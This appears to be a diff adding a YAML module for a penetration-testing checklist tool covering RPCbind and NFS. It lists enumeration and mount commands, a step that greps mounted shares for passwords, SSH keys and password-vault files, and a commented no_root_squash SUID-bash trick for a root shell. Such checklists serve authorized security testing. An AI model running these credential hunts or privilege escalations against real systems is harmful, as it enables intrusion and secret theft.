@@ -1,0 +1,75 @@
+module: nfs
+name: RPCbind / NFS (111 / 2049)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: rpcinfo
+        text: Enumerate RPC programs via portmapper (111)
+        commands: |
+          rpcinfo -p $IP
+          rpcinfo $IP
+          nmap -p111 --script=rpcinfo $IP
+      - id: version
+        text: Confirm NFS service + version (2049)
+        commands: |
+          nmap -p111,2049 -sV -sC $IP
+          rpcinfo -u $IP nfs
+
+  - id: enum
+    name: Export Enumeration
+    steps:
+      - id: showmount
+        text: List exported shares and allowed hosts
+        commands: |
+          showmount -e $IP
+          showmount -a $IP
+          showmount -d $IP
+      - id: nse
+        text: NSE NFS enumeration (exports + statfs + ls)
+        commands: |
+          nmap -p111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs $IP
+
+  - id: mount
+    name: Mount & Browse
+    steps:
+      - id: mount
+        text: Mount an export read-only and browse
+        commands: |
+          sudo mkdir -p /mnt/nfs
+          sudo mount -t nfs -o vers=3 $IP:<export> /mnt/nfs -o nolock
+          ls -la /mnt/nfs
+      - id: mount_v4
+        text: Try NFSv4 if v3 refused
+        commands: |
+          sudo mount -t nfs4 $IP:/ /mnt/nfs
+      - id: loot
+        text: Hunt readable secrets on the share
+        manual: true
+        commands: |
+          grep -rniE 'password|id_rsa|\.kdbx|\.conf' /mnt/nfs 2>/dev/null
+          find /mnt/nfs -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null
+
+  - id: privesc
+    name: Privilege Escalation
+    authorized: true
+    steps:
+      - id: no_root_squash
+        text: no_root_squash SUID abuse (root on export = root shell)
+        commands: |
+          # export shows (rw,no_root_squash). As root locally:
+          # cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
+          # on target as low-priv user: /path/to/export/bash -p
+      - id: uid_spoof
+        text: UID spoofing for a specific file owner
+        manual: true
+        commands: |
+          # create local user with the target file's UID, then read/write as them
+      - id: root_squash_note
+        text: Note squash setting (root_squash vs no_root_squash)
+        manual: true
+        commands: |
+          # root_squash maps root->nobody; no_root_squash / no_all_squash = abusable
